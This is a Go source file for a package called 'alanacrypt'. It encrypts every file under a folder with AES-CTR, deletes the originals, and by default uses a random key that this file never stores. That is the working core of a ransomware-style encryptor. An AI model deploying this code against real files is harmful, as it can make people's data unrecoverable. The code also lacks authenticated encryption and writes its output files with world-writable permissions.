package alanacrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"errors"
	"fmt"
	"io"
	"os"
	"sync"
	"sync/atomic"
)

const (
	DEFAULT_BUFFER_SIZE = 4096
)

type FolderEncryption struct {
	Folder        string
	FileExtension string
	BufferSize    int
	SymmetricKey  []byte
	Logger        Logger
}

type EncOptions func(*FolderEncryption)

func WithEncryptionKey(key []byte) EncOptions {
	return func(encOpt *FolderEncryption) {
		encOpt.SymmetricKey = key
	}
}

func WithBufferSize(size int) EncOptions {
	return func(encOpt *FolderEncryption) {
		encOpt.BufferSize = size
	}
}

func WithLogger(logger Logger) EncOptions {
	return func(encOpt *FolderEncryption) {
		encOpt.Logger = logger
	}
}

func (opts *FolderEncryption) log(raceSafe bool, args ...interface{}) {
	if opts.Logger != nil {
		if raceSafe {
			logMutex.Lock()
			defer logMutex.Unlock()
		}
		opts.Logger.Log(args)
	}
}

func NewFolderEncryption(pathToEncrypt string, fileExtension string, opts ...EncOptions) (*FolderEncryption, error) {
	enc := &FolderEncryption{
		Folder:        pathToEncrypt,
		BufferSize:    DEFAULT_BUFFER_SIZE,
		FileExtension: fileExtension,
		SymmetricKey:  nil,
		Logger:        nil,
	}

	for _, optFunction := range opts {
		optFunction(enc)
	}

	if enc.SymmetricKey == nil {
		enc.SymmetricKey = CreateAES256Key()
	}

	return enc, nil
}

func FileEncryption(filePath string, key []byte, bufferSize int, fileExtension string) error {
	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		return errors.New(fmt.Sprintf("Encrypting FAILED at cipher creation. ERROR: %s", err.Error()))
	}

	iv := make([]byte, cipherBlock.BlockSize())
	_, err = rand.Read(iv)
	if err != nil {
		return errors.New(fmt.Sprintf("Encrypting FAILED at IV creation. ERROR: %s", err.Error()))
	}

	infile, err := os.Open(filePath)
	if err != nil {
		return errors.New(fmt.Sprintf("Encrypting FAILED at opening file -> %s ERROR: %s", filePath, err.Error()))
	}
	outfile, err := os.OpenFile(filePath+"."+fileExtension, os.O_RDWR|os.O_CREATE, 0777)
	if err != nil {
		return errors.New(fmt.Sprintf("Encrypting FAILED at opening file -> %s ERROR: %s", filePath+"."+fileExtension, err.Error()))
	}
	defer infile.Close()
	defer outfile.Close()

	buffer := make([]byte, bufferSize)
	stream := cipher.NewCTR(cipherBlock, iv)
	var errorEncrypting error = nil

	for {
		bytePosition, err := infile.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			errorEncrypting = err
			break
		}

		stream.XORKeyStream(buffer, buffer[:bytePosition])
		_, err = outfile.Write(buffer[:bytePosition])
		if err != nil {
			errorEncrypting = err
			break
		}
	}

	if errorEncrypting == nil {
		_, err := outfile.Write(iv)
		if err != nil {
			return errors.New("Error appending IV -> " + err.Error())
		}
	}

	return errorEncrypting
}

func (opts *FolderEncryption) Encrypt() (int64, error) {
	opts.log(false, "Encrypting root path:", opts.Folder)
	files := GetFiles(opts.Folder)

	var totalFilesEncrypted int64 = 0
	var wg sync.WaitGroup
	wg.Add(len(files))

	opts.log(false, "Started encription of", len(files))
	for _, file := range files {
		go func(file string) {
			err := FileEncryption(file, opts.SymmetricKey, opts.BufferSize, opts.FileExtension)
			if err != nil {
				opts.log(true, "Failed encrypting file ->", file, err.Error())
			} else {
				opts.log(true, "Success encrypting file ->", file)
				err = os.Remove(file)
				if err != nil {
					opts.log(true, "Failed removing file after encryption ->", file)
				} else {
					atomic.AddInt64(&totalFilesEncrypted, 1)
				}
			}
			wg.Done()
		}(file)
	}

	wg.Wait()
	opts.log(false, fmt.Sprintf("Finished encription of %d files from %d", totalFilesEncrypted, len(files)))

	return totalFilesEncrypted, nil
}

func CreateAES256Key() []byte {
	key := make([]byte, 32)
	_, err := rand.Read(key)
	if err != nil {
		return nil
	}
	return key
}
